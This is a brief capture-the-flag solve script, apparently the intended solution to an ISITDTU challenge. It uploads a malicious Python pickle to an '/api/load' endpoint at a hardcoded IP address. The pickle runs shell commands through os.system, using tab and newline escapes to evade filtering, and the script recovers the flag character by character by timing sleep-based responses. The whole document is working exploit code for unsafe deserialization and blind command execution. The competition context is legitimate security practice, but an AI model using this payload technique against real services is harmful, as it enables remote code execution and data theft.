### Intended:
```python
import requests
import string
import time

string = string.ascii_letters + string.digits + "}@!_"
flag = ""
url = "http://20.198.223.134:22222/"

flag = "ISITDTU{"


while "}" not in flag:
    for j in string:
        # \x0a = \n and \x09 = tab
        print(j,end="\r")
        data =f'''(cos\x0asystem\x0aS'if\x09grep\x09-q\x09"^{flag+j}"\x09f*;then\x09sleep\x094;fi'\x0ao'''
        start = time.time()
        r = requests.post(url + "/api/load", files={"file":('file.pkl',data)})
        end = time.time()
        if end - start > 3:
            flag += j
            print(flag)
            break
```
